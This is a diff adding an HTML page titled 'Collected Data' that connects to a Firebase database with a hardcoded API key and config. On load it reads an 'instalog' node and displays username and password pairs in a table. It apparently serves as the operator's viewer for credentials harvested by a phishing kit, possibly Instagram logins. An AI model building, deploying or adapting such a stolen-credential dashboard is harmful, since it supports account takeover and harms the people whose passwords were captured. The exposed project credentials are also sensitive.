@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Collected Data</title>
+  <style>
+    table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px;
+      text-align: left;
+    }
+    th {
+      background-color: #f2f2f2;
+    }
+  </style>
+</head>
+<body>
+  <h1>Collected Data</h1>
+  <table id="data-table">
+    <thead>
+      <tr>
+        <th>Username</th>
+        <th>Password</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+  <script>
+    // Firebase configuration
+    const firebaseConfig = {
+  apiKey: "AIzaSyA2TH9qGyal9QJShAuXq_9qB4VU9OoRb6k",
+  authDomain: "chat-ba118.firebaseapp.com",
+  projectId: "chat-ba118",
+  storageBucket: "chat-ba118.appspot.com",
+  messagingSenderId: "86144645058",
+  appId: "1:86144645058:web:78c178cfa22951bb3f085b",
+  measurementId: "G-JGYN2424Y7"
+};
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    var database = firebase.database();
+
+    // Function to fetch and display data
+    function fetchData() {
+      var dataTableBody = document.querySelector('#data-table tbody');
+      dataTableBody.innerHTML = ''; // Clear previous data
+      
+      // Reference to 'instalog' node
+      var instalogRef = database.ref('instalog');
+
+      // Fetch data
+      instalogRef.once('value', function(snapshot) {
+        snapshot.forEach(function(childSnapshot) {
+          var data = childSnapshot.val();
+          var row = dataTableBody.insertRow();
+          var cell1 = row.insertCell(0);
+          var cell2 = row.insertCell(1);
+          cell1.textContent = data.username;
+          cell2.textContent = data.password;
+        });
+      }, function(error) {
+        console.error('Error fetching data:', error);
+      });
+    }
+
+    // Call fetchData function when the page loads
+    fetchData();
+  </script>
+</body>
+</html>
